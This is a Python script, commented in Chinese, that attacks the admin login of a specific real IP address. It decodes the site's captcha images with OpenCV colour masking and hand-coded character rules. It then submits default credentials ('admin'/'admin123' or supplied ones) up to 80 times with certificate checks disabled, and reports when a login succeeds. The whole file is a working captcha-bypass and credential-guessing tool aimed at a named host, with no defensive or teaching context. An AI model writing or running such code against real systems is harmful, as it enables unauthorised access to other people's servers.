#!/usr/bin/env python3
"""101.201.82.174 cv2验证码识别+登录"""
import urllib.request, http.cookiejar, ssl, io, re, sys, time, json
import cv2
import numpy as np

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj), urllib.request.HTTPSHandler(context=ctx))
op.addheaders = [("User-Agent","Mozilla/5.0")]
B = "https://101.201.82.174"

def get_captcha():
    r = op.open(f"{B}/customer/admin/verify.html", timeout=8)
    return np.frombuffer(r.read(), np.uint8)

def get_char_boxes(img):
    target = np.array([25, 42, 128])
    mask = cv2.inRange(img, target-45, target+45)
    kernel = cv2.getStructuringElement(cv2.MORPH_RECT, (3,3))
    mask = cv2.morphologyEx(mask, cv2.MORPH_CLOSE, kernel)
    contours, _ = cv2.findContours(mask, cv2.RETR_EXTERNAL, cv2.CHAIN_APPROX_SIMPLE)
    boxes = sorted([cv2.boundingRect(c) for c in contours], key=lambda b:b[0])
    # 过滤掉跨全宽的干扰线
    boxes = [b for b in boxes if b[2] < 100 and b[3] > 15 and b[3] < 55]
    return mask, boxes

def ascii_art(mask, box, w_pad=1):
    x,y,w,h = box
    rows = []
    for yy in range(y, y+h):
        line = "".join("#" if mask[yy,xx] else "." for xx in range(x, x+w))
        rows.append(line)
    return rows

def classify_char(rows):
    """根据ASCII特征识别字符"""
    if not rows: return "?"
    H = len(rows)
    W = max(len(r) for r in rows)
    norm = [r + "."*(W-len(r)) for r in rows]
    top = norm[0]
    bot = norm[-1]
    mid = norm[H//2]
    left_col = sum(1 for r in norm if r[0]=="#") / H
    right_col = sum(1 for r in norm if r[-1]=="#") / H
    has_top = "#" in top[:max(1,W//2)]
    has_bot = "#" in bot[:max(1,W//2)]
    has_mid = "#" in mid[:max(1,W//2)]
    mid_right = "#" in mid[W//2:]
    top_right = "#" in top[W//2:]
    bot_right = "#" in bot[W//2:]

    # 数字
    if left_col > 0.7 and right_col < 0.3 and has_top and has_bot: return "1"
    if left_col > 0.5 and right_col > 0.5 and has_top and has_bot and has_mid: return "8"
    if left_col > 0.5 and right_col > 0.5 and has_top and not has_bot and mid_right: return "6"
    if left_col < 0.3 and right_col > 0.5 and has_top and has_bot and not has_mid: return "9"
    if left_col > 0.7 and right_col < 0.5 and has_top and not has_bot and mid_right: return "2"
    if left_col > 0.7 and not has_top and has_bot: return "3"
    # 字母
    if left_col > 0.5 and right_col > 0.5 and not has_top and not has_bot and has_mid: return "H"
    if left_col < 0.3 and right_col < 0.3 and not has_top and not has_bot: return "X"
    if left_col < 0.3 and right_col < 0.3 and has_top: return "T"
    if left_col > 0.5 and right_col < 0.3 and not has_top and not has_bot: return "K"
    if left_col > 0.5 and right_col > 0.5 and not has_top and not has_bot and not has_mid:
        return "N" if W > 6 else "V"
    if left_col > 0.7 and right_col < 0.4 and has_top and has_bot: return "E"
    if left_col > 0.7 and right_col < 0.4 and has_top and not has_bot: return "F"
    if left_col > 0.5 and right_col > 0.5 and has_top and not has_bot: return "U"
    if W > 10 and left_col > 0.3 and right_col > 0.3 and not has_mid: return "W"
    return "?"

def login(user, pwd, code):
    data = f"username={user}&password={pwd}&verify={code}".encode()
    try:
        r = op.open(urllib.request.Request(f"{B}/customer/admin/dologin.html", data=data), timeout=8)
        return json.loads(r.read().decode("utf-8","ignore"))
    except Exception as e:
        return {"status":-1,"msg":str(e)[:60]}

user = sys.argv[1] if len(sys.argv) > 1 else "admin"
pwd = sys.argv[2] if len(sys.argv) > 2 else "admin123"

for i in range(80):
    data = get_captcha()
    img = cv2.imdecode(data, cv2.IMREAD_COLOR)
    if img is None: continue
    mask, boxes = get_char_boxes(img)
    if len(boxes) != 4:
        print(f"[{i}] boxes={len(boxes)}", flush=True)
        continue
    code = ""
    for b in boxes:
        rows = ascii_art(mask, b)
        code += classify_char(rows)
    if "?" in code:
        print(f"[{i}] 低置信: {code}", flush=True)
    r = login(user, pwd, code)
    if r.get("status") == 1:
        print(f"!!! 登录成功 {user}/{pwd} code={code}", flush=True)
        break
    elif "验证码" in str(r.get("msg","")):
        print(f"[{i}] code={code} 验证码错", flush=True)
    else:
        print(f"[{i}] code={code} -> {r}", flush=True)
    time.sleep(0.3)
print("DONE")
